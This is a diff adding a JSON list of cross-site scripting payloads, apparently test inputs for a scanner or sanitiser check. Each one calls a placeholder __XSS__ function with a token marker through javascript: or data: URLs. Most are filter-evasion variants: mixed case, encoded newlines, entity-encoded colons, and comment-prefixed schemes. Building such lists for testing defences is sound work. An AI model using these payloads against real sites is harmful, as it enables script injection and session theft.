@@ -1,0 +1,16 @@
+[
+  "javascript:__XSS__('{{TOKEN}}')",
+  "javascript:void(__XSS__('{{TOKEN}}'))",
+  "javascript:alert('{{TOKEN}}');__XSS__('{{TOKEN}}')",
+  "data:text/html,<script>__XSS__('{{TOKEN}}')</script>",
+  "data:text/html,<svg/onload=__XSS__('{{TOKEN}}')>",
+  "data:text/html,%3Csvg%20onload=__XSS__('{{TOKEN}}')%3E",
+  "javascript:globalThis['__XSS__']('{{TOKEN}}')",
+  "JaVaScRiPt:__XSS__('{{TOKEN}}')",
+  "java%0ascript:__XSS__('{{TOKEN}}')",
+  "javascript&colon;__XSS__('{{TOKEN}}')",
+  "javascript://localhost/%0a__XSS__('{{TOKEN}}')",
+  "javascript://127.0.0.1/%0a__XSS__('{{TOKEN}}')",
+  "javascript://example.com/%0a__XSS__('{{TOKEN}}')",
+  "javascript://open.spotify.com/embed/%0a__XSS__('{{TOKEN}}')"
+]
